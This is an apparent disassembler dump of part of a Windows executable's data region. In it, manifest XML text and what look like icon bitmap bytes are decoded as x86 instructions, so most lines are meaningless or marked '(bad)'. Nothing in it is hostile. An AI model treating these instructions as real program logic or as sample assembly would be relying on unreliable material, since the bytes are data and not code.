  4047d0:	and    BYTE PTR [ecx+eiz*2],bh
  4047d3:	jne    0x404849
  4047d5:	outs   dx,DWORD PTR ds:[esi]
  4047d6:	inc    ebp
  4047d7:	ins    BYTE PTR es:[edi],dx
  4047d8:	gs jbe 0x40483c
  4047db:	je     0x404842
  4047dd:	ds je  0x404852
  4047e0:	jne    0x404847
  4047e2:	cmp    al,0x2f
  4047e4:	popa   
  4047e5:	jne    0x40485b
  4047e7:	outs   dx,DWORD PTR ds:[esi]
  4047e8:	inc    ebp
  4047e9:	ins    BYTE PTR es:[edi],dx
  4047ea:	gs jbe 0x40484e
  4047ed:	je     0x404854
  4047ef:	ds or  eax,0x2020200a
  4047f5:	cmp    al,0x2f
  4047f7:	popa   
  4047f8:	jae    0x404867
  4047fa:	jbe    0x40482f
  4047fc:	cmp    dh,BYTE PTR [edi+0x69]
  4047ff:	outs   dx,BYTE PTR ds:[esi]
  404800:	outs   dx,DWORD PTR fs:[esi]
  404802:	ja     0x404877
  404804:	push   ebx
  404805:	gs je  0x40487c
  404808:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  40480f:	cmp    al,0x2f
  404811:	popa   
  404812:	jae    0x404881
  404814:	jbe    0x404849
  404816:	cmp    ah,BYTE PTR [ecx+0x70]
  404819:	jo     0x404887
  40481b:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404822:	ds or  eax,0x612f3c0a
  404828:	jae    0x40489d
  40482a:	gs ins DWORD PTR es:[edi],dx
  40482c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404830:	or     eax,0xa
  404835:	add    BYTE PTR [eax],al
  404837:	add    BYTE PTR [eax],ch
  404839:	add    BYTE PTR [eax],al
  40483b:	add    BYTE PTR [eax],dh
  40483d:	add    BYTE PTR [eax],al
  40483f:	add    BYTE PTR [eax+0x0],ah
  404842:	add    BYTE PTR [eax],al
  404844:	add    DWORD PTR [eax],eax
  404846:	add    al,0x0
  404848:	add    BYTE PTR [eax],al
  40484a:	add    BYTE PTR [eax],al
  40484c:	add    BYTE PTR [eax+eax*1],0x0
	...
  404864:	add    BYTE PTR [eax],al
  404866:	add    BYTE PTR [eax],0x0
  404869:	add    BYTE PTR [eax],0x0
  40486c:	add    BYTE PTR [eax+0x800080],al
  404872:	add    BYTE PTR [eax],al
  404874:	add    BYTE PTR [eax],0x80
  404877:	add    BYTE PTR [eax-0x7fffff80],al
  40487d:	add    BYTE PTR [eax-0x3f3f4000],0x0
  404884:	add    BYTE PTR [eax],al
  404886:	inc    DWORD PTR [eax]
  404888:	add    bh,bh
  40488a:	add    BYTE PTR [eax],al
  40488c:	add    bh,bh
  40488e:	inc    DWORD PTR [eax]
  404890:	inc    DWORD PTR [eax]
  404892:	add    BYTE PTR [eax],al
  404894:	inc    DWORD PTR [eax]
  404896:	inc    DWORD PTR [eax]
  404898:	(bad)  
  404899:	inc    DWORD PTR [eax]
  40489b:	add    bh,bh
  40489d:	(bad)  
  40489e:	inc    DWORD PTR [eax]
	...
  4048f4:	or     BYTE PTR [eax+0x8888],cl
	...
  40490a:	add    BYTE PTR [eax-0x7070071],cl
  404910:	mov    BYTE PTR [eax+0x0],cl
	...
  404922:	mov    al,bh
  404924:	clc    
  404925:	mov    BYTE PTR [eax-0x77770771],cl
	...
  404937:	add    BYTE PTR [eax],al
  404939:	mov    BYTE PTR [eax-0x70000778],cl
  40493f:	(bad)
  404943:	jo     0x404945
	...
  40494d:	add    BYTE PTR [eax],al
  40494f:	add    BYTE PTR [eax],cl
  404951:	mov    BYTE PTR [eax-0x7777008],cl
  404957:	mov    BYTE PTR [eax+0x877888],cl
	...
  404965:	add    BYTE PTR [eax],al
  404967:	add    BYTE PTR [eax],cl
  404969:	mov    BYTE PTR [eax-0x77070778],cl
  40496f:	vpmacssdql xmm0,xmm6,xmm0,XMMWORD PTR [edi+0x0]
  404979:	add    BYTE PTR [eax],al
  40497b:	add    BYTE PTR [eax],al
  40497d:	add    BYTE PTR [eax],al
  40497f:	add    BYTE PTR [eax],cl
  404981:	mov    BYTE PTR [eax-0x77077778],cl
  404987:	mov    BYTE PTR [eax+0x887777],cl
	...
  404995:	add    BYTE PTR [eax],al
  404997:	add    BYTE PTR [eax],cl
  404999:	mov    BYTE PTR [eax-0x7777778],cl
  40499f:	mov    BYTE PTR [edi+0x878787],al
  4049a5:	add    BYTE PTR [eax],al
  4049a7:	add    BYTE PTR [eax],al
  4049a9:	pop    es
  4049aa:	ja     0x4049ac
  4049ac:	add    BYTE PTR [eax],al
  4049ae:	add    BYTE PTR [eax],al
  4049b0:	add    BYTE PTR [eax-0x77777778],cl
  4049b6:	mov    BYTE PTR [eax+0x77],bh
  4049b9:	ja     0x404a33
  4049bb:	js     0x4049c5
  4049bd:	add    BYTE PTR [eax],0x0
  4049c0:	add    BYTE PTR [eax+0x7f],bh
  4049c3:	xchg   DWORD PTR [ecx+0x77],esi
  4049c6:	jo     0x4049c8
  4049c8:	add    BYTE PTR [eax],cl
  4049ca:	js     0x404954
  4049cc:	mov    BYTE PTR [edi+0x77077777],al
  4049d2:	mov    BYTE PTR [eax+0x8088],cl
  4049d8:	or     BYTE PTR [edi+0x77778878],al
  4049de:	clc    
  4049df:	jo     0x4049e1
  4049e1:	add    BYTE PTR [eax],cl
  4049e3:	ja     0x40496c
  4049e5:	ja     0x404a5e
  4049e7:	ja     0x404970
  4049e9:	mov    BYTE PTR [eax+0x808888],cl
  4049ef:	add    BYTE PTR [eax],cl
  4049f1:	mov    BYTE PTR [eax-0x78],bh
  4049f4:	mov    BYTE PTR [edi+0x77],dh
  4049f7:	mov    BYTE PTR [eax+0x0],dh
  4049fa:	add    BYTE PTR [eax],al
  4049fc:	xchg   DWORD PTR [edi+0x77],esi
  4049ff:	js     0x404a79
  404a01:	mov    BYTE PTR [eax+0x808888],cl
  404a07:	add    BYTE PTR [eax],cl
  404a09:	js     0x404993
  404a0b:	mov    BYTE PTR [eax-0x7888871],cl
  404a11:	jo     0x404a13
  404a13:	xchg   DWORD PTR [edi-0x79],esi
  404a16:	xchg   DWORD PTR [eax+0x6c7c8888],ecx
  404a1c:	mov    BYTE PTR [eax-0x77f80000],cl
  404a22:	js     0x4049ab
  404a24:	js     0x4049ae
  404a26:	push   DWORD PTR [edi+0x77]
  404a29:	js     0x404aa3
  404a2b:	js     0x4049b4
  404a2d:	mov    BYTE PTR [eax-0x79],bh
  404a30:	jl     0x404a7e
  404a32:	inc    esp
  404a33:	les    ecx,FWORD PTR [eax+0x8000088]
  404a39:	mov    BYTE PTR [eax+0x77778787],cl
  404a3f:	xchg   DWORD PTR [eax-0x78],edi
  404a42:	mov    BYTE PTR [edi-0x3b9b8379],al
  404a48:	les    ebp,FWORD PTR [esp+ebp*2+0x64]
  404a4c:	mov    BYTE PTR [edi-0x77f80000],al
  404a52:	mov    BYTE PTR [edi+0x78877778],al
  404a58:	mov    BYTE PTR [edi+0x444c5677],al
  404a5e:	inc    esp
  404a5f:	dec    esp
  404a60:	ins    BYTE PTR es:[edi],dx
  404a61:	pop    esp
  404a62:	jl     0x404ac0
  404a64:	mov    BYTE PTR [eax-0x77f80000],cl
  404a6a:	mov    BYTE PTR [eax-0x78778788],cl
  404a70:	jbe    0x404ac6
  404a72:	inc    esp
  404a73:	inc    esp
  404a74:	inc    esp
  404a75:	inc    esp
  404a76:	mov    edi,0xc6c6c647
  404a7c:	jg     0x404a05
  404a7e:	add    BYTE PTR [eax],al
  404a80:	or     BYTE PTR [eax-0x78777878],cl
  404a86:	inc    esi
  404a87:	inc    esp
  404a88:	inc    esp
  404a89:	inc    esp
  404a8a:	inc    esp
  404a8b:	dec    esp
  404a8c:	inc    esp
  404a8d:	fs dec esp
  404a8f:	ins    BYTE PTR es:[edi],dx
  404a90:	jl     0x404b0e
  404a92:	jl     0x404b10
  404a94:	js     0x404a1e
  404a96:	add    BYTE PTR [eax],al
  404a98:	or     BYTE PTR [eax-0x78787878],cl
  404a9e:	inc    esp
  404a9f:	inc    esp
  404aa0:	inc    esp
  404aa1:	inc    esp
  404aa2:	dec    esp
  404aa3:	inc    esp
  404aa4:	push   0x7c7cc784
  404aa9:	jl     0x404a37
  404aab:	mov    WORD PTR [eax-0x78],?
  404aae:	add    BYTE PTR [eax],al
  404ab0:	or     al,bh
  404ab2:	mov    BYTE PTR [eax+0x56448878],cl
  404ab8:	les    eax,FWORD PTR [esi+0x44]
  404abb:	inc    esi
  404abc:	mov    BYTE PTR [edi-0x737383b4],al
  404ac2:	out    0xc8,eax
  404ac4:	iret   
  404ac5:	xchg   DWORD PTR [eax],eax
  404ac7:	add    BYTE PTR [eax],cl
  404ac9:	mov    BYTE PTR [eax+0x46888887],cl
  404acf:	les    esi,FWORD PTR [esp+ecx*2+0x44]
  404ad3:	push   0xc8488888
  404ad8:	enter  0xc8e7,0x7c
  404adc:	mov    al,bh
  404ade:	add    BYTE PTR [eax],al
  404ae0:	or     BYTE PTR [eax-0x77777788],cl
  404ae6:	push   esp
  404ae7:	je     0x404b2f
  404ae9:	push   esp
  404aea:	inc    esi
  404aeb:	vpmacsswd xmm1,xmm6,xmm0,XMMWORD PTR [esp+r9d*4-0x37717379]
  404af6:	add    BYTE PTR [eax],0x8
  404af9:	mov    BYTE PTR [eax+0x64888888],cl
  404aff:	jl     0x404b7d
  404b01:	fs js  0x404b03
  404b04:	pop    esp
  404b05:	jg     0x404afe
  404b07:	js     0x404af1
  404b09:	enter  0x7878,0x78
  404b0d:	test   DWORD PTR [eax+0x78880800],0x74888888
  404b17:	jl     0x404b8d
  404b19:	inc    esp
  404b1a:	pop    DWORD PTR [edi-0x3707373c]
  404b20:	js     0x404aa9
  404b22:	ja     0x404b9c
  404b24:	enter  0x8088,0x0
  404b28:	or     BYTE PTR [eax-0x77777788],cl
  404b2e:	jl     0x404ba4
  404b30:	jl     0x404b7e
  404b32:	ja     0x404af8
  404b34:	mov    BYTE PTR [edi-0x71],0x88
  404b38:	ja     0x404ac1
  404b3a:	mov    cs,WORD PTR [eax+0x808888]
  404b40:	or     BYTE PTR [eax-0x78],bh
  404b43:	mov    BYTE PTR [eax+0x767c8488],cl
  404b49:	inc    esp
  404b4a:	les    ebp,FWORD PTR [esp+ecx*2-0x34]
  404b4e:	(bad)  
  404b4f:	test   DWORD PTR [edi-0x18787272],0x70f8
  404b59:	jp     0x404bd3
  404b5b:	mov    BYTE PTR [eax-0x3a887b78],cl
  404b61:	inc    esp
  404b62:	dec    esp
  404b63:	dec    esp
  404b64:	ins    BYTE PTR es:[edi],dx
  404b65:	dec    esp
  404b66:	js     0x404b60
  404b68:	js     0x404af2
  404b6a:	mov    al,ch
  404b6c:	mov    BYTE PTR [eax+0x33000080],cl
  404b72:	js     0x404b6c
  404b74:	clc    
  404b75:	clc    
  404b76:	test   BYTE PTR [eax+0x6c],bh
  404b79:	dec    esp
  404b7a:	ins    BYTE PTR es:[edi],dx
  404b7b:	dec    esp
  404b7c:	dec    esp
  404b7d:	ins    BYTE PTR es:[edi],dx
  404b7e:	mov    BYTE PTR [edi-0x77777779],cl
  404b84:	xchg   DWORD PTR [eax+0x70000070],ecx
  404b8a:	js     0x404b14
  404b8c:	mov    BYTE PTR [edi+0x46c4c887],cl
  404b92:	(bad)  
  404b93:	(bad)  
  404b94:	int3   
  404b95:	into   
  404b96:	mov    BYTE PTR [eax-0x77777709],cl
  404b9c:	mov    BYTE PTR [edi+0x74000070],cl
  404ba2:	js     0x404b9c
  404ba4:	(bad)
  404ba8:	dec    esp
  404ba9:	dec    esp
  404baa:	dec    esp
  404bab:	ins    BYTE PTR es:[edi],dx
  404bac:	mov    bh,0x88
  404baf:	mov    BYTE PTR [eax-0x77777788],cl
  404bb5:	mov    BYTE PTR [eax-0x77890000],cl
  404bbb:	(bad)  
  404bbc:	clc    
  404bbd:	pop    DWORD PTR [edi+0x6c4cc4c7]
  404bc3:	(bad)  
  404bc4:	int3   
  404bc5:	enter  0x8888,0x88
  404bc9:	mov    BYTE PTR [eax+0x788f888f],cl
  404bcf:	add    BYTE PTR [eax],al
  404bd1:	js     0x88404bd6
  404bd7:	(bad)  
  404bd8:	dec    esp
  404bd9:	ins    BYTE PTR es:[edi],dx
  404bda:	dec    esp
  404bdb:	dec    esp
  404bdc:	int3   
  404bdd:	enter  0xf8f8,0x88
  404be1:	mov    BYTE PTR [eax-0x77700108],cl
  404be7:	add    BYTE PTR [eax],al
  404be9:	add    BYTE PTR [eax],al
  404beb:	mov    BYTE PTR [eax-0x3bbb7701],cl
  404bf1:	dec    esp
  404bf2:	ins    BYTE PTR es:[edi],dx
  404bf3:	mov    dh,0xcf
  404bf6:	(bad)
  404bfa:	mov    al,bh
  404bfc:	clc    
  404bfd:	pop    DWORD PTR [edi+0x0]
  404c03:	add    BYTE PTR [eax],cl
  404c05:	mov    BYTE PTR [eax+0x4c6c4c44],cl
  404c0b:	ins    BYTE PTR es:[edi],dx
  404c0c:	int3   
  404c0d:	mov    al,bh
  404c0f:	(bad)  
  404c10:	clc    
  404c11:	mov    al,bh
  404c13:	(bad)  
  404c14:	clc    
  404c15:	(bad)
  404c19:	add    BYTE PTR [eax],al
  404c1b:	add    BYTE PTR [eax],al
  404c1d:	add    BYTE PTR [eax-0x333bbbb4],cl
  404c23:	int3   
  404c24:	ins    BYTE PTR es:[edi],dx
  404c25:	(bad)  
  404c26:	(bad)  
  404c27:	(bad)  
  404c28:	(bad)  
  404c29:	dec    DWORD PTR [edi-0x78707778]
  404c2f:	add    BYTE PTR [eax],al
  404c31:	add    BYTE PTR [eax],al
  404c33:	add    BYTE PTR [eax],al
  404c35:	add    BYTE PTR [eax],cl
  404c37:	inc    esp
  404c38:	mov    dh,0xc6
  404c3b:	(bad)  
  404c3c:	int3   
  404c3d:	(bad)  
  404c3e:	clc    
  404c3f:	clc    
  404c40:	mov    BYTE PTR [esi-0x10771778],cl
  404c46:	mov    BYTE PTR [eax],al
  404c48:	add    BYTE PTR [eax],al
  404c4a:	add    BYTE PTR [eax],al
  404c4c:	add    BYTE PTR [eax],al
  404c4e:	or     BYTE PTR [esp+eax*2-0x3c],ah
  404c52:	int3   
  404c53:	int3   
  404c54:	int3   
  404c55:	call   0x8928d4e8
  404c5a:	mov    al,bh
  404c5c:	clc    
  404c5d:	inc    DWORD PTR [eax+0x0]
  404c63:	add    BYTE PTR [eax],al
  404c65:	add    BYTE PTR [eax],cl
  404c67:	pop    esp
  404c68:	dec    esp
  404c69:	dec    esp
  404c6a:	fs jbe 0x404bf4
  404c6d:	mov    BYTE PTR [eax-0x70707078],cl
  404c73:	add    BYTE PTR [eax],0x0
	...
  404c7e:	or     BYTE PTR [esi+0x77],dh
  404c81:	mov    BYTE PTR [eax-0x70777071],cl
  404c87:	add    BYTE PTR [eax],0x0
	...
  404c96:	or     BYTE PTR [eax-0x7f707778],cl
	...
  404cac:	add    BYTE PTR [eax],al
  404cae:	add    al,dh
	...
  404d20:	(bad)  
  404d21:	(bad)  
  404d22:	(bad)  
  404d23:	(bad)  
  404d24:	(bad)  
  404d25:	inc    DWORD PTR [eax]
  404d27:	add    bh,bh
  404d29:	(bad)  
  404d2a:	(bad)  
  404d2b:	(bad)  
  404d2c:	(bad)  
  404d2d:	inc    DWORD PTR [eax]
  404d2f:	add    bh,bh
  404d31:	(bad)  
  404d32:	(bad)  
  404d33:	(bad)  
  404d34:	(bad)  
  404d35:	inc    DWORD PTR [eax]
  404d37:	add    bh,bh
  404d39:	(bad)  
  404d3a:	inc    DWORD PTR [eax+0xffff]
  404d40:	(bad)  
  404d41:	(bad)  
  404d42:	cld    
  404d43:	add    BYTE PTR [edi],cl
  404d45:	inc    DWORD PTR [eax]
  404d47:	add    bh,bh
  404d49:	push   eax
  404d4b:	add    BYTE PTR [ebx],al
  404d4d:	inc    DWORD PTR [eax]
  404d4f:	add    bh,bh
  404d51:	inc    eax
  404d53:	add    BYTE PTR [ecx],al
  404d55:	inc    DWORD PTR [eax]
  404d57:	add    bh,bh
  404d59:	inc    DWORD PTR [eax+0xff0000]
  404d5f:	add    bh,bh
  404d61:	inc    DWORD PTR [eax+0xff0000]
  404d67:	add    bh,bh
  404d69:	inc    DWORD PTR [eax+0xff0000]
  404d6f:	add    bh,bh
  404d71:	inc    DWORD PTR [eax+0xff0000]
  404d77:	add    bl,ah
  404d79:	inc    eax
  404d7b:	add    BYTE PTR [eax],al
  404d7d:	lahf   
  404d7e:	add    BYTE PTR [eax],al
  404d80:	rol    BYTE PTR [edi],0xe0
  404d83:	add    BYTE PTR [eax],al
  404d85:	pop    ds
  404d86:	add    BYTE PTR [eax],al
  404d88:	add    BYTE PTR [ecx],0xf8
  404d8b:	add    BYTE PTR [eax],al
  404d8d:	pop    ds
  404d8e:	add    BYTE PTR [eax],al
  404d90:	add    BYTE PTR [eax],0x7f
  404d93:	add    BYTE PTR [eax],al
  404d95:	pop    ds
  404d96:	add    BYTE PTR [eax],al
  404d98:	add    BYTE PTR [eax],0x1c
  404d9b:	add    BYTE PTR [eax],al
  404d9d:	sldt   WORD PTR [eax]
  404da0:	add    BYTE PTR [eax],0x0
  404da3:	add    BYTE PTR [eax],al
  404da5:	sldt   WORD PTR [eax]
  404da8:	add    BYTE PTR [eax],0x0
  404dab:	add    BYTE PTR [eax],al
  404dad:	sldt   WORD PTR [eax]
  404db0:	add    BYTE PTR [eax],0x0
  404db3:	add    BYTE PTR [eax],al
  404db5:	sldt   WORD PTR [eax]
  404db8:	add    BYTE PTR [eax],0x0
  404dbb:	add    BYTE PTR [eax],al
  404dbd:	sldt   WORD PTR [eax]
  404dc0:	add    BYTE PTR [eax],0x0
  404dc3:	add    BYTE PTR [eax],al
  404dc5:	sldt   WORD PTR [eax]
  404dc8:	add    BYTE PTR [eax],0x0
  404dcb:	add    BYTE PTR [eax],al
  404dcd:	sldt   WORD PTR [eax]
  404dd0:	add    BYTE PTR [eax],0x0
  404dd3:	add    BYTE PTR [eax],al
  404dd5:	sldt   WORD PTR [eax]
  404dd8:	add    BYTE PTR [eax],0x0
  404ddb:	add    BYTE PTR [eax],al
  404ddd:	sldt   WORD PTR [eax]
  404de0:	add    BYTE PTR [eax],0x0
  404de3:	add    BYTE PTR [eax],al
  404de5:	pop    es
  404de6:	add    BYTE PTR [eax],al
  404de8:	add    BYTE PTR [eax],0x0
  404deb:	add    BYTE PTR [eax],al
  404ded:	pop    es
  404dee:	add    BYTE PTR [eax],al
  404df0:	add    BYTE PTR [eax],0x0
  404df3:	add    BYTE PTR [eax],al
  404df5:	pop    es
  404df6:	add    BYTE PTR [eax],al
  404df8:	add    BYTE PTR [eax],0x0
  404dfb:	add    BYTE PTR [eax],al
  404dfd:	pop    es
  404dfe:	add    BYTE PTR [eax],al
  404e00:	add    BYTE PTR [eax],0x0
  404e03:	add    BYTE PTR [eax],al
  404e05:	pop    es
  404e06:	add    BYTE PTR [eax],al
  404e08:	rol    BYTE PTR [eax],0x0
  404e0b:	add    BYTE PTR [eax],al
  404e0d:	pop    es
  404e0e:	add    BYTE PTR [eax],al
  404e10:	rol    BYTE PTR [eax],0x0
  404e13:	add    BYTE PTR [eax],al
  404e15:	pop    es
  404e16:	add    BYTE PTR [eax],al
  404e18:	rol    BYTE PTR [eax],0x0
  404e1b:	add    BYTE PTR [eax],al
  404e1d:	pop    es
  404e1e:	add    BYTE PTR [eax],al
  404e20:	rol    BYTE PTR [eax],0x0
  404e23:	add    BYTE PTR [eax],al
  404e25:	add    eax,DWORD PTR [eax]
  404e27:	add    al,al
  404e29:	add    BYTE PTR [eax],al
  404e2b:	add    BYTE PTR [eax],al
  404e2d:	add    eax,DWORD PTR [eax]
  404e2f:	add    al,ah
  404e31:	add    BYTE PTR [eax],al
  404e33:	add    BYTE PTR [eax],al
  404e35:	add    eax,DWORD PTR [eax]
  404e37:	add    ah,bh
  404e39:	add    BYTE PTR [eax],al
  404e3b:	add    BYTE PTR [eax],al
  404e3d:	add    eax,DWORD PTR [eax]
  404e3f:	add    bh,bh
  404e41:	add    BYTE PTR [eax],0x0
  404e44:	add    BYTE PTR [ebx],al
  404e46:	add    BYTE PTR [eax],al
  404e48:	push   eax
  404e4a:	add    BYTE PTR [eax],al
  404e4c:	add    BYTE PTR [ebx],al
  404e4e:	add    BYTE PTR [eax],al
  404e50:	(bad)  
  404e51:	clc    
  404e52:	add    BYTE PTR [eax],al
  404e54:	add    BYTE PTR [ebx],al
  404e56:	add    BYTE PTR [eax],al
  404e58:	(bad)  
  404e59:	clc    
  404e5a:	add    BYTE PTR [eax],al
  404e5c:	add    BYTE PTR [edi],al
  404e5e:	add    BYTE PTR [eax],al
  404e60:	(bad)  
  404e61:	clc    
  404e62:	add    BYTE PTR [eax],al
  404e64:	add    edi,edi
  404e66:	add    BYTE PTR [eax],al
  404e68:	(bad)  
  404e69:	clc    
  404e6a:	add    BYTE PTR [ecx],al
  404e6c:	(bad)  
  404e6d:	inc    DWORD PTR [eax]
  404e6f:	add    bh,bh
  404e71:	clc    
  404e72:	add    edi,edi
  404e74:	(bad)  
  404e75:	inc    DWORD PTR [eax]
  404e77:	add    bh,bh
  404e79:	std    
  404e7a:	(bad)  
  404e7b:	(bad)  
  404e7c:	(bad)  
  404e7d:	inc    DWORD PTR [eax]
  404e7f:	add    bh,bh
  404e81:	(bad)  
  404e82:	(bad)  
  404e83:	(bad)  
  404e84:	(bad)  
  404e85:	inc    DWORD PTR [eax]
  404e87:	add    bh,bh
  404e89:	(bad)  
  404e8a:	(bad)  
  404e8b:	(bad)  
  404e8c:	(bad)  
  404e8d:	inc    DWORD PTR [eax]
  404e8f:	add    bh,bh
  404e91:	(bad)  
  404e92:	(bad)  
  404e93:	(bad)  
  404e94:	(bad)  
  404e95:	inc    DWORD PTR [eax]
  404e97:	add    bh,bh
  404e99:	(bad)  
  404e9a:	(bad)  
  404e9b:	(bad)  
  404e9c:	(bad)  
  404e9d:	inc    DWORD PTR [eax]
  404e9f:	add    BYTE PTR [eax],ch
  404ea1:	add    BYTE PTR [eax],al
  404ea3:	add    BYTE PTR [eax],ah
  404ea5:	add    BYTE PTR [eax],al
  404ea7:	add    BYTE PTR [eax+0x0],al
  404eaa:	add    BYTE PTR [eax],al
  404eac:	add    DWORD PTR [eax],eax
  404eae:	add    al,0x0
  404eb0:	add    BYTE PTR [eax],al
  404eb2:	add    BYTE PTR [eax],al
  404eb4:	add    BYTE PTR [edx],al
	...
  404ece:	add    BYTE PTR [eax],0x0
  404ed1:	add    BYTE PTR [eax],0x0
  404ed4:	add    BYTE PTR [eax+0x800080],al
  404eda:	add    BYTE PTR [eax],al
  404edc:	add    BYTE PTR [eax],0x80
  404edf:	add    BYTE PTR [eax-0x7fffff80],al
  404ee5:	add    BYTE PTR [eax-0x3f3f4000],0x0
  404eec:	add    BYTE PTR [eax],al
  404eee:	inc    DWORD PTR [eax]
  404ef0:	add    bh,bh
  404ef2:	add    BYTE PTR [eax],al
  404ef4:	add    bh,bh
  404ef6:	inc    DWORD PTR [eax]
  404ef8:	inc    DWORD PTR [eax]
  404efa:	add    BYTE PTR [eax],al
  404efc:	inc    DWORD PTR [eax]
  404efe:	inc    DWORD PTR [eax]
  404f00:	(bad)  
  404f01:	inc    DWORD PTR [eax]
  404f03:	add    bh,bh
  404f05:	(bad)  
  404f06:	inc    DWORD PTR [eax]
	...
  404f30:	or     BYTE PTR [edi+0x88],cl
	...
  404f3e:	add    BYTE PTR [eax],cl
  404f40:	(bad)  
  404f41:	clc    
  404f42:	(bad)
	...
  404f4e:	or     BYTE PTR [edi-0x77707771],cl
  404f54:	mov    BYTE PTR [eax],al
	...
  404f5e:	mov    BYTE PTR [eax-0x77777071],cl
  404f64:	mov    BYTE PTR [eax+0x0],al
  404f6a:	add    BYTE PTR [eax],al
  404f6c:	add    BYTE PTR [eax],al
  404f6e:	mov    BYTE PTR [eax-0x77770708],cl
  404f74:	xchg   DWORD PTR [eax+0x0],eax
  404f7a:	add    BYTE PTR [eax],al
  404f7c:	add    BYTE PTR [eax],al
  404f7e:	mov    BYTE PTR [eax-0x78777778],cl
  404f84:	ja     0x404f06
  404f86:	add    BYTE PTR [eax],al
  404f88:	add    BYTE PTR [edi+0x70],dh
  404f8b:	add    BYTE PTR [eax],al
  404f8d:	add    BYTE PTR [eax],cl
  404f8f:	mov    BYTE PTR [eax+0x78777788],cl
  404f95:	mov    BYTE PTR [eax-0x877f900],al
  404f9b:	ja     0x405015
  404f9d:	add    BYTE PTR [eax],al
  404f9f:	or     BYTE PTR [eax+0x77],bh
  404fa2:	ja     0x40501b
  404fa4:	mov    BYTE PTR [edi-0x78f8ff78],cl
  404faa:	mov    BYTE PTR [edi+0x8777],al
  404fb0:	xchg   DWORD PTR [edi+0x78],esi
  404fb3:	clc    
  404fb4:	clc    
  404fb5:	js     0x404f3f
  404fb7:	add    BYTE PTR [eax],cl
  404fb9:	xchg   DWORD PTR [eax+0x7777f778],ecx
  404fbf:	mov    BYTE PTR [eax+0x447c8888],cl
  404fc5:	(bad)  
  404fc6:	mov    BYTE PTR [eax],al
  404fc8:	pop    es
  404fc9:	mov    BYTE PTR [eax+0x77],bh
  404fcc:	js     0x404f5d
  404fce:	clc    
  404fcf:	mov    BYTE PTR [edi+0x44],dh
  404fd2:	inc    esp
  404fd3:	inc    esp
  404fd4:	mov    bh,0xf8
  404fd7:	add    BYTE PTR [eax],cl
  404fd9:	mov    BYTE PTR [edi+0x74878888],al
  404fdf:	inc    esp
  404fe0:	inc    esp
  404fe1:	dec    esp
  404fe2:	ins    BYTE PTR es:[edi],dx
  404fe3:	mov    edi,0x70088c7
  404fe9:	mov    BYTE PTR [eax+0x78],bh
  404fec:	je     0x405032
  404fee:	inc    esp
  404fef:	inc    esp
  404ff0:	inc    esi
  404ff1:	dec    esp
  404ff2:	ja     0x404fbb
  404ff4:	mov    edi,0x880800f7
  404ffa:	mov    BYTE PTR [eax+0x44],bh
  404ffd:	inc    esp
  404ffe:	inc    esp
  404fff:	inc    esi
  405000:	mov    BYTE PTR [eax+ecx*8-0x38],al
  405004:	enter  0x88ce,0x0
  405008:	pop    es
  405009:	test   DWORD PTR [eax+0x64657488],0x7c77f848
  405013:	mov    ?,WORD PTR [edi+0x77]
  405016:	clc    
  405017:	add    BYTE PTR [eax],cl
  405019:	xchg   DWORD PTR [eax+0x47c77488],ecx
  40501f:	(bad)  
  405020:	pop    eax
  405021:	xchg   DWORD PTR [eax-0x77833738],ecx
  405027:	add    BYTE PTR [edi],al
  405029:	xchg   DWORD PTR [eax+0x787c8488],ecx
  40502f:	test   ah,0xf8
  405032:	enter  0x8888,0x88
  405036:	mov    BYTE PTR [eax],al
  405038:	pop    es
  405039:	xchg   DWORD PTR [eax-0x39887b78],ecx
  40503f:	push   esp
  405040:	les    edi,FWORD PTR [edi-0x79]
  405043:	xchg   DWORD PTR [esi+0x780f88c],ecx
  405049:	mov    bh,0x88
  40504b:	mov    BYTE PTR [esp+edi*2-0x37333bbc],al
  405052:	test   DWORD PTR [eax-0x7f777778],0x888f2707
  40505c:	hlt    
  40505d:	test   BYTE PTR [esp+ecx*2+0x6c],cl
  405061:	push   0x8888688f
  405066:	mov    BYTE PTR [eax-0x7077b8f9],al
  40506c:	xchg   esp,eax
  40506e:	mov    dh,0xcc
  405071:	iret   
  405072:	mov    BYTE PTR [eax+0x70888888],cl
  405078:	or     BYTE PTR [eax-0x1],bh
  40507b:	clc    
  40507c:	xchg   DWORD PTR [esp+ebp*2+0x4c],eax
  405080:	int3   
  405081:	(bad)
  405085:	clc    
  405086:	pop    DWORD PTR [eax-0x77f800]
  40508c:	xchg   DWORD PTR [esp+ecx*2-0x3a],ecx
  405090:	int3   
  405091:	(bad)
  405095:	dec    DWORD PTR [eax+0x80]
  40509b:	mov    BYTE PTR [edi-0x3333b9b4],al
  4050a1:	(bad)  
  4050a2:	dec    DWORD PTR [eax-0x7f107771]
  4050a8:	add    BYTE PTR [eax],al
  4050aa:	add    BYTE PTR [eax],al
  4050ac:	mov    BYTE PTR [esp+ecx*8+0x4c],al
  4050b0:	(bad)  
  4050b1:	mov    BYTE PTR [eax-0x70777178],cl
  4050b7:	add    BYTE PTR [eax],0x0
  4050ba:	add    BYTE PTR [eax],al
  4050bc:	or     BYTE PTR [esp+ecx*2+0x67],al
  4050c0:	enter  0x8888,0x88
  4050c4:	(bad)  
  4050c5:	(bad)  
  4050c6:	inc    DWORD PTR [eax]
  4050c8:	add    BYTE PTR [eax],al
  4050ca:	add    BYTE PTR [eax],al
  4050cc:	or     BYTE PTR [eax-0x78],bh
  4050cf:	(bad)  
  4050d0:	(bad)
	...
  4050dc:	or     al,bh
	...
  405106:	add    BYTE PTR [eax],al
  405108:	(bad)  
  405109:	(bad)  
  40510a:	(bad)  
  40510b:	(bad)  
  40510c:	(bad)  
  40510d:	(bad)  
  40510e:	(bad)  
  40510f:	(bad)  
  405110:	(bad)  
  405111:	inc    DWORD PTR [ebx+0xfeffff]
  405117:	(bad)  
  405118:	(bad)  
  405119:	clc    
  40511a:	add    BYTE PTR [edi],bh
  40511c:	push   eax
  40511e:	add    BYTE PTR [edi],bl
  405120:	push   eax
  405122:	add    BYTE PTR [edi],bl
  405124:	push   eax
  405126:	add    BYTE PTR [edi],bl
  405128:	xbegin 0x3ec0582e
  40512e:	add    BYTE PTR [ebx],al
  405130:	or     BYTE PTR [edi],0x0
  405133:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405139:	add    BYTE PTR [eax],al
  40513b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405141:	add    BYTE PTR [eax],al
  405143:	add    eax,DWORD PTR [eax-0x7ffd0000]
  405149:	add    BYTE PTR [eax],al
  40514b:	add    eax,DWORD PTR [eax-0x7ffd0000]
